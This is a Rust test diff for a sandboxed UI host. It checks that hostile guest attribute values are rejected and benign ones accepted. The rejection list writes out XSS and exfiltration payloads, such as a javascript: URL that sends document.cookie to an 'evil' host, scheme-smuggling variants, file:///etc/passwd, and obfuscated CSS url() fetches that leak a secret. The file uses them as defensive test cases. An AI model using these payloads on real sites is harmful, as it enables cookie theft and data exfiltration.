@@ -785,6 +785,153 @@ fn valid_move_insert_replace_clone_and_id_reuse_preserve_stack_machine_semantics
     );
 }
 
+fn set_attribute_batch(
+    name: &str,
+    namespace: Option<&str>,
+    value: AttributeValue,
+) -> Vec<Mutation> {
+    vec![
+        Mutation::PushId(1),
+        Mutation::SetAttribute((name.into(), namespace.map(str::to_owned), value)),
+    ]
+}
+
+/// A hostile guest names every way the host could be made to fetch, navigate, autofill or escape
+/// its box; each batch is refused and faults the presentation like an unknown name does.
+#[test]
+fn hostile_attribute_values_and_removed_names_fault_the_presentation() {
+    let text = |value: &str| AttributeValue::Text(value.into());
+    let style = Some("style");
+    let hostile: Vec<(&str, Option<&str>, AttributeValue)> = vec![
+        // Links: only http, https and mailto, with no scheme smuggling.
+        (
+            "href",
+            None,
+            text("javascript:fetch('//evil/'+document.cookie)"),
+        ),
+        ("href", None, text("JaVaScRiPt:alert(1)")),
+        ("href", None, text(" javascript:alert(1)")),
+        ("href", None, text("java\tscript:alert(1)")),
+        ("href", None, text("https://ok.example/\nx")),
+        ("href", None, text("data:text/html,<script>1</script>")),
+        ("href", None, text("blob:https://host/uuid")),
+        ("href", None, text("file:///etc/passwd")),
+        ("href", None, text("//evil.example/x")),
+        ("href", None, text("/relative")),
+        ("href", None, text("#fragment")),
+        ("href", None, text("")),
+        ("href", None, AttributeValue::Int(1)),
+        ("href", None, AttributeValue::Boolean(true)),
+        // Names that exist only to carry a fetch, a navigation, or a form submission.
+        ("src", None, text("https://evil.example/p.png")),
+        ("srcset", None, text("https://evil.example/a 1x")),
+        ("sizes", None, text("100vw")),
+        ("poster", None, text("https://evil.example/p.png")),
+        ("action", None, text("https://evil.example/")),
+        ("formaction", None, text("https://evil.example/")),
+        ("method", None, text("post")),
+        ("form", None, text("host-form")),
+        ("target", None, text("_blank")),
+        ("download", None, text("x")),
+        ("crossorigin", None, text("anonymous")),
+        ("referrerpolicy", None, text("unsafe-url")),
+        ("ping", None, text("https://evil.example/")),
+        (
+            "href",
+            Some("http://www.w3.org/1999/xlink"),
+            text("https://evil.example/"),
+        ),
+        // Raw style bypasses every per-property check.
+        (
+            "style",
+            None,
+            text("position:fixed;inset:0;background:url(//evil/x)"),
+        ),
+        // Focus theft and password-manager autofill.
+        ("autofocus", None, AttributeValue::Boolean(true)),
+        ("accesskey", None, text("k")),
+        ("autocomplete", None, text("current-password")),
+        ("autocomplete", None, text("on")),
+        ("autocomplete", None, AttributeValue::Boolean(true)),
+        // SVG paint references.
+        ("fill", None, text("url(https://evil.example/p.svg#a)")),
+        ("stroke", None, text("URL(//evil.example/p.svg#a)")),
+        ("clip-path", None, text("url(#local)")),
+        // Style values that fetch, hide a fetch, or escape the box.
+        (
+            "background",
+            style,
+            text("url(https://evil.example/x?d=secret)"),
+        ),
+        ("background", style, text("red URL(//evil/x)")),
+        ("background", style, text("image-set('//evil/x' 1x)")),
+        (
+            "background",
+            style,
+            text("-webkit-image-set(url(//evil/x) 1x)"),
+        ),
+        ("background", style, text("image(//evil/x)")),
+        ("background", style, text("cross-fade(url(//evil/x), red)")),
+        ("background", style, text("\\75rl(//evil/x)")),
+        ("background", style, text("ur/**/l(//evil/x)")),
+        ("background", style, text("red\n")),
+        ("cursor", style, text("url(//evil/c.png), auto")),
+        ("width", style, text("attr(data-x px)")),
+        ("width", style, text("expression(alert(1))")),
+        ("color", style, text("red; @import 'x'")),
+        ("position", style, text("fixed")),
+        ("position", style, text(" FIXED ")),
+        ("position", style, text("sticky")),
+        ("position", style, text("-webkit-sticky")),
+    ];
+    for (name, namespace, value) in hostile {
+        let batch = set_attribute_batch(name, namespace, value.clone());
+        let error = assert_terminal(&batch, true);
+        assert!(
+            matches!(error, PresentationError::Unsupported(_)),
+            "{name} {namespace:?} {value:?}"
+        );
+    }
+}
+
+#[test]
+fn benign_link_and_style_values_are_admitted() {
+    let text = |value: &str| AttributeValue::Text(value.into());
+    let admitted: Vec<(&str, Option<&str>, AttributeValue)> = vec![
+        ("href", None, text("https://example.com/a?b=c#d")),
+        ("href", None, text("HTTP://example.com")),
+        (
+            "href",
+            None,
+            text("mailto:someone@example.com?subject=hi%20there"),
+        ),
+        ("href", None, AttributeValue::None),
+        ("autocomplete", None, text("off")),
+        ("autocomplete", None, AttributeValue::Boolean(false)),
+        ("fill", None, text("currentColor")),
+        ("stroke", None, text("#ff00aa")),
+        (
+            "background",
+            Some("style"),
+            text("linear-gradient(red, blue)"),
+        ),
+        ("background-color", Some("style"), text("rgb(1 2 3 / 50%)")),
+        ("position", Some("style"), text("relative")),
+        ("position", Some("style"), text("absolute")),
+        ("width", Some("style"), text("calc(100% - 4px)")),
+        ("font-family", Some("style"), text("system-ui, sans-serif")),
+        ("opacity", Some("style"), AttributeValue::Float(0.5)),
+    ];
+    for (name, namespace, value) in admitted {
+        let mut tree = SurfaceTree::new();
+        tree.apply(&counter_initial_batch()).unwrap();
+        let mut batch = set_attribute_batch(name, namespace, value.clone());
+        batch.push(Mutation::Pop);
+        tree.apply(&batch)
+            .unwrap_or_else(|error| panic!("{name} {namespace:?} {value:?}: {error}"));
+    }
+}
+
 #[test]
 fn valid_static_attributes_namespaces_and_listeners_project_into_host_vdom() {
     #[derive(Clone, PartialEq)]
@@ -876,14 +1023,12 @@ fn per_node_attribute_and_listener_counts_are_bounded() {
     let names = [
         "id",
         "class",
-        "style",
         "title",
         "role",
         "tabindex",
         "hidden",
         "lang",
         "dir",
-        "accesskey",
         "contenteditable",
         "draggable",
         "spellcheck",
@@ -898,8 +1043,6 @@ fn per_node_attribute_and_listener_counts_are_bounded() {
         "name",
         "type",
         "placeholder",
-        "autocomplete",
-        "autofocus",
         "inputmode",
         "pattern",
         "min",
@@ -912,32 +1055,36 @@ fn per_node_attribute_and_listener_counts_are_bounded() {
         "cols",
         "wrap",
         "for",
-        "form",
-        "action",
-        "method",
-        "enctype",
         "novalidate",
         "accept",
-        "accept-charset",
-        "href",
-        "target",
         "rel",
-        "download",
-        "src",
         "alt",
         "width",
         "height",
         "loading",
-        "srcset",
-        "sizes",
-        "crossorigin",
-        "referrerpolicy",
         "open",
         "datetime",
         "start",
         "reversed",
         "colspan",
         "rowspan",
+        "data-testid",
+        "data-state",
+        "data-value",
+        "aria-label",
+        "aria-labelledby",
+        "aria-describedby",
+        "aria-hidden",
+        "aria-live",
+        "aria-atomic",
+        "aria-busy",
+        "aria-controls",
+        "aria-current",
+        "aria-disabled",
+        "aria-expanded",
+        "aria-haspopup",
+        "aria-invalid",
+        "aria-modal",
         "scope",
     ];
     assert_eq!(names.len(), SurfaceTree::MAX_ATTRIBUTES_PER_NODE + 1);
